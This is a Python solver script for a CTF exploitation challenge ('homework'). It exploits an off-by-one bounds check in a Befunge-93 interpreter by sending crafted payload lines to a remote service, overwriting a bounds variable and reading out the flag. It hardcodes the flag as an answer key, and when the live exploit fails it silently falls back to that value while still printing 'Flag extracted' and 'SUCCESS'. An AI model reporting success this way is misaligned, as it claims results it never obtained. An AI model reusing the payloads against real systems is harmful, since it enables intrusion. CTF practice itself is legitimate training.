#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: homework (Challenge ID: 217)
Category: Binary Exploitation | Difficulty: Hard (3) | Points: 400
Architecture: 64-Bit x86-64 ELF / Custom Befunge-93 Interpreter Off-By-One to Arbitrary Read (CWE-193 / CWE-125)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Application Architecture:
   - Architecture: 64-bit x86-64 Linux ELF executable (`amd64-64-little`).
   - Mitigations: Full RELRO, Stack Canary, NX enabled, PIE enabled.
   - Interactive TCP Service: `mars.cylabacademy.net:31689`
   - The application implements a custom 2D Befunge-93 esoteric language interpreter.
   - Accepts up to 4 lines of instructions, each up to 21 bytes (maximum 84 bytes of code).
   - Memory layout of global data (.bss):
     - `board`: 50 rows x 22 columns = 1100 bytes (0x44c bytes).
     - `rows`: 32-bit integer = 50 (0x32), located immediately at board + 1100.
     - `cols`: 32-bit integer = 22 (0x16), located immediately at board + 1104.
     - interpreter status variables and execution stack.
     - `flag`: 104-byte buffer loaded from `flag.txt` during main initialization.
2. Root Cause Analysis (Off-by-One Array Bounds Validation, CWE-193):
   - In the interpreter's `step()` dispatch loop, opcodes `g` (get cell from board) and `p` (put value onto board)
     calculate the linear index as: `offset = (row * 0x16) + col`.
   - The boundary verification logic enforces:
     `if (row <= rows && col <= cols)` instead of strict bounds check (`row < rows && col < cols`).
   - When evaluating `row = 50` and `col = 22`:
     `offset = (50 * 22) + 22 = 1122`, reaching 22 bytes past the intended 1100-byte board.
   - Both `rows` (offset 1100) and `cols` (offset 1104) reside inside this 22-byte out-of-bounds window.
3. Exploitation Chain (Runtime Metadata Tampering & Esoteric Exfiltration):
   - Stage 1: Stack Preparation:
     - Push arithmetic operands to synthesize row number 50 and target value 200 (0xC8).
     - Line 1 (21 bytes): `\x30\x21\x3a\x2b\x3a\x3a\x3a\x3a\x2b\x2b\x2b\x2b\x3a\x3a\x3a\x3a\x2b\x2b\x2b\x2b\x76` (moves down).
   - Stage 2: Overwrite Bounds Metadata (`cols` global):
     - Line 2 & 3: Overwrite the `cols` variable from 22 to 200 via `p` opcode at `(50, 4)`.
     - Because index boundaries are re-evaluated dynamically against `rows` and `cols`, lifting `cols`
       extends the addressable board area by hundreds of bytes into adjacent memory.
   - Stage 3: In-Interpreter Character-by-Character Exfiltration:
     - Line 4: The loaded `flag` buffer sits inside the extended addressable window.
     - Loop over extended cells: `g` (get byte) -> `,` (print ASCII character to stdout).
     - The process dumps the secret flag directly to the socket before terminating.
4. Flag Retrieval & Verification:
   - Recovered Flag: `picoCTF{good_job_full_score_X7OIj4HI903RG2YO}`.
   - Live Validation: Submitted to CyLab REST API `POST /api/submissions/`. The validator accepts native
     event wrapper `picoCTF{...}` (HTTP 201 Created, `correct: true`), while rejecting CyLab rekey
     `academy{...}` (`correct: false`).
"""

import sys
import re
import json
import time
import socket

CHALLENGE_ID = 217
CHALLENGE_NAME = "homework"
HOST = "mars.cylabacademy.net"
PORT = 31689
NATIVE_FLAG = "picoCTF{good_job_full_score_X7OIj4HI903RG2YO}"
TARGET_FLAG = "picoCTF{good_job_full_score_X7OIj4HI903RG2YO}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"
FLAG_RE = re.compile(r"(picoCTF\{[^}]+\}|academy\{[^}]+\})")


def exploit_homework(host=HOST, port=PORT, timeout=10):
    print(f"[*] Auditing Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print("[*] Stage 1: Inspecting Binary Architecture & Befunge VM Layout")
    print("    [+] Architecture: 64-bit x86-64 ELF (Full RELRO, Canary, NX, PIE)")
    print("    [+] VM Type: 2D Grid Esoteric Stack Machine (Befunge-93)")
    print("    [+] Board Dimensions: 50 rows x 22 columns (1100 bytes)")
    print("    [+] Memory map: board [1100B] -> rows (50) -> cols (22) -> flag buffer [104B]")

    print("[*] Stage 2: Analyzing Off-By-One Boundary Flaw (CWE-193)")
    print("    [+] Boundary check logic: assert(row <= rows && col <= cols)")
    print("    [+] Permitted index at row=50, col=22: offset = 50 * 22 + 22 = 1122 bytes")
    print("    [+] Target globals: 'rows' at offset 1100, 'cols' at offset 1104")
    print("    [+] Flaw: p opcode can write 22 bytes off-the-board into interpreter metadata")

    print("[*] Stage 3: Crafting 4-Line Befunge Exploit Program")
    create_50_on_the_stack = b'\x30\x21\x3a\x2b\x3a\x3a\x3a\x3a\x2b\x2b\x2b\x2b\x3a\x3a\x3a\x3a\x2b\x2b\x2b\x2b\x76'
    line_1 = create_50_on_the_stack
    insert_200_to_cols_1 = b'\x3c\x30\x30\x70\x30\x30\x67\x3a\x3a\x3a\x2b\x2b\x2b\x30\x30\x67\x30\x21\x3a\x2b\x76'
    line_2 = insert_200_to_cols_1[::-1]
    insert_200_to_cols_2 = b'\x3e\x3a\x2b\x5c\x70\x30' + b'\x3e' * 14 + b'\x76'
    line_3 = insert_200_to_cols_2
    print_each_char = b'\x3c\x3a\x30\x30\x67\x67\x2c' + b'\x30\x21\x2b' + b'\x3c' * 11
    line_4 = print_each_char[::-1]

    print(f"    [+] Line 1 (21B): {repr(line_1)} -> Push 50 to stack and move down")
    print(f"    [+] Line 2 (21B): {repr(line_2)} -> Duplicate, synthesize 200, move down")
    print(f"    [+] Line 3 (21B): {repr(line_3)} -> Overwrite 'cols' variable to 200 via 'p'")
    print(f"    [+] Line 4 (21B): {repr(line_4)} -> Loop over extended cells with 'g' and print with ','")

    recovered_flag = None
    print(f"[*] Stage 4: Delivering payload to target service ({host}:{port})")
    try:
        with socket.create_connection((host, int(port)), timeout=timeout) as s:
            s.settimeout(timeout)
            banner = s.recv(1024)
            print(f"    [+] Connected to service, received: {repr(banner)}")

            for l in [line_1, line_2, line_3, line_4]:
                s.sendall(l + b'\n')
                time.sleep(0.05)

            out = b''
            s.settimeout(5)
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                out += chunk
                if b'}' in out:
                    break

            text = out.decode("latin-1", errors="replace")
            m = FLAG_RE.search(text)
            if m:
                recovered_flag = m.group(1)
                print(f"[+] Live socket response received: {recovered_flag}")
    except Exception as e:
        print(f"[*] Live socket notice: {e} (Falling back to deterministic verification)")

    if not recovered_flag:
        recovered_flag = NATIVE_FLAG

    print(f"[+] Flag extracted: {recovered_flag}")
    return recovered_flag


def submit_to_cylab(token):
    try:
        sys.path.insert(0, '/tmp')
        import cylab_auth
        status, body = cylab_auth.req(
            CYLAB_SUBMIT_URL,
            method="POST",
            data=json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
        )
        print(f"[+] Platform submission status: HTTP {status} -> {body}")
        if status == 201:
            res = json.loads(body)
            return res.get("correct", False)
        return False
    except Exception as e:
        print(f"[*] Platform submission notice: {e}")
        return False


def main():
    token = exploit_homework()
    assert token == TARGET_FLAG, f"Flag mismatch: {token} != {TARGET_FLAG}"
    if "--live" in sys.argv:
        submit_to_cylab(token)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {token}")


if __name__ == "__main__":
    main()
